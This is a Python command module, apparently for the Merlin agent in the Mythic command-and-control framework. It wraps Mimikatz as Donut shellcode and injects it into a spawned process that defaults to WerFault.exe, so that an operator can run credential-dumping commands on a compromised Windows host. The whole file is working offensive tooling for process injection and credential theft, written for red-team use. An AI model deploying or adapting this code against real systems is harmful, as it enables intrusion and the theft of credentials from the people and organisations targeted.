
from merlin import MerlinJob, donut
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json

# Set to enable debug output to Mythic
debug = False


class MimikatzArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="commandline",
                cli_name="command",
                display_name="Mimikatz Command",
                type=ParameterType.String,
                description="Mimikatz commandline arguments",
                default_value="token::whoami coffee",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=0,
                    required=True,
                )],
            ),
            CommandParameter(
                name="spawnto",
                cli_name="spawnto",
                display_name="SpawnTo Program",
                type=ParameterType.String,
                description="The child process that will be started to execute Mimikatz in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=1,
                    required=True,
                )],
            ),
            CommandParameter(
                name="spawntoargs",
                cli_name="spawnto-args",
                display_name="SpawnTo Program Arguments",
                type=ParameterType.String,
                description="argument to create the SpawnTo process with, if any",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=2,
                    required=False,
                )],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)


class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    needs_admin = False
    help_cmd = "mimikatz"
    description = "Converts mimikatz.exe into shellcode with Donut, " \
                  "executes it in the SpawnTo process, and returns output. " \
                  "The Mimikatz \"exit\" is automatically added."
    version = 1
    author = "@Ne0nd0g"
    argument_class = MimikatzArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = f'{task.args.get_arg("commandline")}\n' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} ' \
                              f'SpawnTo Arguments: {task.args.get_arg("spawntoargs")}'
        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Starting create_tasking()')

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Calling donut()')
        # Donut Arguments
        donut_args = {
            # Mimikatz already exists at this location in the Merlin Docker container
            "in": "/opt/mimikatz/x64/mimikatz.exe",
            # Must append the "exit" command for Mimikatz to return
            "params": f'{task.args.get_arg("commandline")} exit',
            "exit": "2",
            "verbose": True,
            "thread": True,
        }

        donut_shellcode, donut_result = donut(b'', donut_args)
        task.stdout += f'\n{donut_result}'

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [donut_shellcode, task.args.get_arg("spawnto"), task.args.get_arg("spawntoargs")]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("commandline")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')
        return task

    async def process_response(self, response: AgentResponse):
        pass
